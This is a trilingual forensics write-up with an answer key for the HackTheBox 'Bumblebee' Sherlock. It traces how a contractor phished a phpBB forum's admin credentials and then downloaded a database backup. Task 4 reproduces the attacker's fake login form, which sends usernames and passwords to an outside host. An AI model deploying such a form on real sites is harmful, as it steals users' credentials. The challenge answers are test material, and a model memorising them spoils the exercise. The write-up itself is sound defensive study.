# Bumblebee [Easy]

> **ES:** Sherlock DFIR: contratista externo roba credenciales de admin del foro Forela (phpBB) vía WiFi de invitados — logs + dump sqlite3.
> **EN:** DFIR sherlock: external contractor steals Forela forum (phpBB) admin credentials over Guest WiFi — logs + sqlite3 dump.

| Campo | Valor |
|-------|-------|
| **Tipo** | DFIR |
| **URL** | https://app.hackthebox.com/sherlocks/bumblebee |
| **Evidencia** | bumblebee.zip |
| **Soluciones en carpeta** | `index.md` (ficha con tasks) + `Bumblebee_writeup.pdf` + `bumblebee.md` |

:::info Sherlock Scenario

An external contractor has accessed the internal forum here at Forela via the Guest WiFi and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.

> [ZH] 一名外部承包商通过客用 WiFi 访问了 Forela 的内部论坛，似乎窃取了管理员用户的凭证！我们附上了论坛的一些日志和完整的 sqlite3 格式数据库转储文件，以帮助您进行调查。
> **ES:** Un contratista accedió al foro interno por la WiFi de invitados y habría robado credenciales del admin: investigar con logs + dump sqlite3.
> **EN:** A contractor reached the internal forum via Guest WiFi and allegedly stole admin credentials: investigate with logs + sqlite3 dump.

:::

## 题目数据 / Datos / Data

[bumblebee.zip](./bumblebee.zip)

## Task 1 — Usuario del contratista / Contractor username

> [ZH] 外部承包商的用户名是什么？
> **ES:** ¿Cuál es el nombre de usuario del contratista externo?
> **EN:** What is the external contractor's username?

En la base de datos, tabla `phpbb_users`:

```plaintext title="Answer"
apoole1
```

## Task 2 — IP de registro / Registration IP

> [ZH] 承包商用来创建其账户的 IP 地址是什么？
> **ES:** ¿Desde qué IP creó el contratista su cuenta?
> **EN:** From which IP did the contractor create the account?

En la misma base de datos anterior:

```plaintext title="Answer"
10.10.0.78
```

## Task 3 — Post malicioso / Malicious post

> [ZH] 承包商制作的恶意帖子的 post_id 是什么？
> **ES:** ¿Cuál es el post_id de la publicación maliciosa del contratista?
> **EN:** What is the post_id of the contractor's malicious post?

En la base de datos, tabla `phpbb_posts`:

```plaintext title="Answer"
9
```

## Task 4 — URI de exfiltración / Exfiltration URI

> [ZH] 凭证窃取器发送数据的完整 URI 是什么？
> **ES:** ¿A qué URI completa envía los datos el robador de credenciales?
> **EN:** To which full URI does the credential stealer send data?

Revisando el post del contratista se halla un formulario de login falso:

```html
<form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
    <div class="panel">
        <div class="inner">
            <div class="content">
                <h2 class="login-title">Login</h2>
                <fieldset class="fields1">
                    <dl>
                        <dt><label for="username">Username:</label></dt>
                        <dd><input type="text" tabindex="1" name="username" id="username" size="25" value=""
                                class="inputbox autowidth"></dd>
                    </dl>
                    <dl>
                        <dt><label for="password">Password:</label></dt>
                        <dd><input type="password" tabindex="2" id="password" name="password" size="25"
                                class="inputbox autowidth" autocomplete="off"></dd>
                    </dl>
                    <dl>
                        <dd><label for="autologin"><input type="checkbox" name="autologin" id="autologin"
                                    tabindex="4">Remember me</label></dd>
                        <dd><label for="viewonline"><input type="checkbox" name="viewonline" id="viewonline"
                                    tabindex="5">Hide my online status this
                                session</label></dd>
                    </dl>
                    <dl>
                        <dt>&nbsp;</dt>
                        <dd> <input type="submit" name="login" tabindex="6" value="Login" class="button1"
                                onclick="sethidden()"></dd>
                    </dl>
                </fieldset class="fields1">
            </div>
        </div>
    </div>
</form>
```

```plaintext title="Answer"
http://10.10.0.78/update.php
```

## Task 5 — Login como admin (UTC) / Admin login (UTC)

> [ZH] 承包商何时以管理员身份登录论坛？（协调世界时）
> **ES:** ¿Cuándo inició sesión el contratista como administrador? (UTC)
> **EN:** When did the contractor log in as administrator? (UTC)

En la tabla `phpbb_log` hay un registro con `operation = LOG_ADMIN_AUTH_SUCCESS` y timestamp `1682506392`:

```plaintext
1682506392 --> Wed 26 April 2023 10:53:12 UTC
```

```plaintext title="Answer"
26/04/2023 10:53:12
```

## Task 6 — Password LDAP / LDAP password

> [ZH] 论坛中有用于 LDAP 连接的明文凭据，密码是什么？
> **ES:** ¿Cuál es la contraseña en claro de la conexión LDAP del foro?
> **EN:** What is the forum's plaintext LDAP connection password?

En la tabla `phpbb_config`, dato `ldap_password`:

```plaintext title="Answer"
Passw0rd1
```

## Task 7 — User-Agent del admin / Admin user-agent

> [ZH] 管理员用户的用户代理是什么？
> **ES:** ¿Cuál es el user-agent del usuario administrador?
> **EN:** What is the administrator's user-agent?

En `phpbb_log`, el registro `LOG_ADMIN_AUTH_SUCCESS` muestra dos IPs:

```plaintext
10.255.254.2
10.10.0.78
```

Ya se estableció que `10.10.0.78` es del contratista, luego `10.255.254.2` es del admin; en `access.log` aparece su user-agent:

```plaintext title="Answer"
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
```

## Task 8 — Auto-alta en admins (UTC) / Self-added to admins (UTC)

> [ZH] 承包商何时将自己添加到管理员组？（协调世界时）
> **ES:** ¿Cuándo se agregó el contratista al grupo de administradores? (UTC)
> **EN:** When did the contractor add themselves to the administrators group? (UTC)

En `phpbb_log` hay un registro `LOG_USERS_ADDED` con datos:

```plaintext
a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
```

Es el registro del contratista uniéndose al grupo de admins:

```plaintext
1682506431 --> Wed 26 April 2023 10:53:51 UTC
```

```plaintext title="Answer"
26/04/2023 10:53:51
```

## Task 9 — Descarga del backup (UTC) / Backup download (UTC)

> [ZH] 承包商何时下载了数据库备份？（协调世界时）
> **ES:** ¿Cuándo descargó el contratista el backup de la base de datos? (UTC)
> **EN:** When did the contractor download the database backup? (UTC)

En `access.log`, buscando `backup`:

```plaintext
10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

```plaintext title="Answer"
26/04/2023 11:01:38
```

## Task 10 — Tamaño del backup / Backup size

> [ZH] 按照 access.log 中的记录，数据库备份的大小是多少字节？
> **ES:** Según `access.log`, ¿de cuántos bytes es el backup?
> **EN:** Per `access.log`, how many bytes is the backup?

Del registro anterior:

```plaintext title="Answer"
34707
```

## Fuentes / Sources

- Dificultad y categoria: [momenbasel/htb-writeups - Sherlocks index](https://github.com/momenbasel/htb-writeups/blob/main/sherlocks/README.md) - fecha de acceso: 2026-09-24.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. Evidencia y respuestas con contexto, no solo la respuesta suelta.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Evidence and contextual answers, not bare answers.

_Fecha de edición: 2026-09-24_
